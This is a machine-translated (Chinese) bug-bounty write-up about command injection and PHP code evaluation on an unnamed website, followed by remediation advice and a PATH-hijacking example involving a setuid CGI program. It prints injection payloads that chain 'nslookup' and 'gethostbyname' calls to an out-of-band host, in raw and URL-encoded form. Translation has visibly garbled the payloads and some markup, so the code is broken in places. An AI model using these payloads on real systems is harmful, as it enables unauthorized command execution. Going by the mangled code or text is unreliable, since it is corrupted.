<html>
<head>
<title>When i found multiple command injection</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">当我发现多个命令注入时</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/when-i-found-multiple-command-injection-ad891d3ad9e6?source=collection_archive---------1-----------------------#2019-09-14">https://infosecwriteups.com/when-i-found-multiple-command-injection-ad891d3ad9e6?source=collection_archive---------1-----------------------#2019-09-14</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><h1 id="8f71" class="jq jr it bd js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn bi translated">大家好，</h1><p id="e534" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">我通过捕获DNS A请求发现了一个命令注入，这发生在输入数据被解释为操作系统命令时。</p><p id="2400" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">这是一个非常关键的问题，应该尽快解决。</p><p id="45c2" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">在没有指定绝对路径的情况下执行命令可能会允许攻击者通过更改$PATH或程序执行环境的其他方面来执行恶意的二进制文件。</p><p id="9b9f" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">这个bug的影响是:</p><p id="971e" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">攻击者可以在系统上执行任意PHP代码。攻击者还可能执行任意系统命令</p><p id="5a97" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">我是如何发现</p><p id="ece8" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">我发现了随机用户输入表单(param=)</p><p id="ac88" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">在param中放了很多东西之后，我尝试= &amp;+nslookup+cxx 8 nlugxbkajjeguq 7 iwpzsdbxnyfj 5 o-a 6 ssjqlda . r87 . me &amp; ' \ " ` 0 &amp; nslookup+cxx 8 nlugxbkajjeguq 7 iwpzsdbxnyfj 5 o-a 6 ssjqlda . r87 . me &amp; ` '(带解码)</p><figure class="ls lt lu lv gt lw gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi lr"><img src="../Images/0160731662c05fa84baa4a4ace6ee112.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*o5EBzwL0454HKZbhzt0aBA.png"/></div></div></figure><p id="a541" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">像这样:= % 2526% 2 bnslookup % 2 bcx 8 nlugxbqajjeguq 7 iwpzsdbxnyfj 5 o-a 6 ssjqlda . r 87 . me % 2526% 2527% 255 c % 2522% 25600% 2526 nslookup % 2 bcx 8 nlugxbqajjeguq 7 iwpzsdbxnyfj 5 o-a 6 ssjqlda . r 87 . me % 2526%</p><p id="63b8" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">然后我得到了</p><p id="b3a2" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated"> <br/> &lt; pre &gt;服务器:xyz <br/>地址:172 . x . x . x&lt;/pre&gt;<br/>/p&gt;<br/>&lt;/div&gt;<br/>&lt;/div&gt;</p><p id="49ec" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">然后我在同一个网站找到了代码评估</p><p id="9971" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">xyz.php？name = % 2 bgethostbyname(trim(' cxx 8 nlugxbab 9 VH _ wuarecplh 8 zuzv 9 vyp 5 zxftg '。VMA . r87 . me ')% 3b % 2f % 2f</p><p id="86f4" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">额外额外额外…..(理论上只是为了增加报告长度)</p><figure class="ls lt lu lv gt lw gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi md"><img src="../Images/99b862f3bbf18c48a43d48941e8623b2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*a6yDUfOpdrJXUVEN"/></div></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">布雷登·安德森在<a class="ae mi" href="https://unsplash.com?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank"> Unsplash </a>上拍摄的照片</figcaption></figure><p id="c9b3" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">不要接受来自最终用户的会被直接解释为源代码的输入。如果这是业务需求，验证应用程序上的所有输入，并删除所有可能被直接解释为PHP源代码的数据。</p><p id="3256" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">利用这个漏洞并不困难。PHP是一种高级语言，有大量的可用资源。成功利用该漏洞需要编程语言知识、访问源代码或生成用于此类攻击的源代码的能力，以及最低限度的攻击技能。</p><p id="4719" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated"><strong class="kq iu">解释</strong></p><p id="e1b6" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">命令注入漏洞有两种形式:</p><p id="2d6d" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">-攻击者可以更改程序执行的命令:攻击者显式地控制命令是什么。</p><p id="deb1" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">-攻击者可以改变命令执行的环境:攻击者隐式控制命令的含义。</p><p id="c59b" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">在这种情况下，我们主要关注第二种情况，在这种情况下，攻击者可以通过更改环境变量或在搜索路径的早期插入恶意的可执行文件来改变命令的含义。这种类型的命令注入漏洞发生在以下情况:</p><p id="a42c" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">1.攻击者修改应用程序的环境。</p><p id="d417" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">2.应用程序在没有指定绝对路径或验证正在执行的二进制文件的情况下执行命令。</p><p id="7e46" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">3.通过执行该命令，应用程序为攻击者提供了攻击者无法获得的特权或能力。</p><p id="7ee1" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">演示当攻击者改变命令的解释方式时会发生什么。该代码来自一个基于网络的CGI工具，它允许用户更改他们的密码。NIS下的密码更新过程包括运行<code class="fe mj mk ml mm b">/var/yp</code>目录下的<code class="fe mj mk ml mm b">make</code>。注意，由于程序更新密码记录，它已经安装了<code class="fe mj mk ml mm b">setuid root</code>。</p><p id="4f4c" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">程序调用<code class="fe mj mk ml mm b">make</code>如下:</p><pre class="ls lt lu lv gt mn mm mo mp aw mq bi"><span id="8275" class="mr jr it mm b gy ms mt l mu mv"><strong class="mm iu">system("cd /var/yp &amp;&amp; make &amp;&gt; /dev/null");</strong></span></pre><p id="b5a3" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">本例中的命令是硬编码的，因此攻击者无法控制传递给<code class="fe mj mk ml mm b">system()</code>的参数。然而，由于程序没有为<code class="fe mj mk ml mm b">make</code>指定绝对路径，并且在调用命令之前没有清理其环境变量，攻击者可能会修改他们的<code class="fe mj mk ml mm b">$PATH</code>变量以指向名为<code class="fe mj mk ml mm b">make</code>的恶意二进制文件，并从shell提示符执行CGI脚本。由于程序已经安装了<code class="fe mj mk ml mm b">setuid root</code>，攻击者的<code class="fe mj mk ml mm b">make</code>版本现在以<code class="fe mj mk ml mm b">root</code>权限运行。</p><p id="f98d" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">环境在程序中系统命令的执行中起着重要的作用。像<code class="fe mj mk ml mm b">system()</code>和<code class="fe mj mk ml mm b">exec()</code>这样的函数使用调用它们的程序的环境，因此攻击者有潜在的机会影响这些调用的行为。</p></div><div class="ab cl mw mx hx my" role="separator"><span class="mz bw bk na nb nc"/><span class="mz bw bk na nb nc"/><span class="mz bw bk na nb"/></div><div class="im in io ip iq"><p id="1777" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated"><em class="nd">关注</em> <a class="ae mi" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="nd"> Infosec报道</em> </a> <em class="nd">获取更多此类精彩报道。</em></p><div class="ne nf gp gr ng nh"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="ni ab fo"><div class="nj ab nk cl cj nl"><h2 class="bd iu gy z fp nm fr fs nn fu fw is bi translated">信息安全报道</h2><div class="no l"><h3 class="bd b gy z fp nm fr fs nn fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="np l"><p class="bd b dl z fp nm fr fs nn fu fw dk translated">medium.com</p></div></div><div class="nq l"><div class="nr l ns nt nu nq nv mb nh"/></div></div></a></div></div></div>    
</body>
</html>